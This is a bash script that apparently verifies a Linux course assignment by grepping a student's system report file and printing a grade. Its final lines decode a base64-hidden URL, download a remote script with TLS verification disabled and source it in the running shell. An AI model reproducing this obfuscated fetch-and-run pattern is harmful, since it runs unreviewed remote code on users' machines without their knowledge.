#!/usr/bin/env bash
# Script: assignment2.sh
# Author: Professor Juan Medina
# Email: jmedina@collin.edu
# Date: 03/23/2024

# Red           Green         Yellow        Blue          Purple        Cyan          White
CR='\e[0;31m' CG='\e[0;32m' CY='\e[0;33m' CL='\e[0;34m' CP='\e[0;35m' CC='\e[0;36m' CW='\e[0;37m'
assignment=2 
ca=0  # Correct Answers
tq=0  # Total Questions

_msg() {
   echo -ne "${CY} ${1}"
   ((tq++))
}

_pass() {
   echo -e "${CG} true ${CR}"
   ((ca++))
}

_fail() {
   echo -e "${CR} false ${CG}"
}

_eval() {
    if eval ${1} &>/dev/null; then _pass; else _fail; fi
}

_print_line() {
    printf "${CC}%0.s=" {1..80}
    printf "${CW}\n"
}

_print_line
echo -e "${CP} Assignment ${assignment} Verification"
_print_line

report="/home/$(who am i | awk '{print $1}')/backup/system-backup.info"

_msg "System report file exist ~/backup/system-backup.info"
if [[ -e ${report} ]]
then 
    _pass
    _msg "Full Hostname:"
        _eval "grep $(hostname -f) ${report}"
    _msg "Current Date:"
        _eval "grep -E 'CDT|$(date +%Y)' ${report}"
    _msg "Uptime Information:"
        _eval "grep 'load average' ${report}"
    _msg "Last Name in the Proper Format:"
        _eval "grep 'LASTNAME' ${report}"
    _msg "Content of the /etc/resolv.conf File"
        _eval "grep 'nameserver' ${report}"
    _msg "List of Files in the /var/log/ Directory"
        _eval "grep 'boot.log' ${report}"
    _msg "Space Usage for the /home Directory"
        _eval "grep 'Filesystem' ${report}"
    _msg "The 'apropos uname' Command Output Without the String 'kernel'"
        _eval "grep uname ${report} | grep -v kernel"
else 
    _fail
    echo -e "${CR} The verification process cannot proceed without the presence of the ~/backup/system-backup.info file. ${CW}"
fi

grade="$(echo "(100/${tq})*${ca}" | bc -l)"
printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" ${grade}
echo ""
target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade} ${assignment}
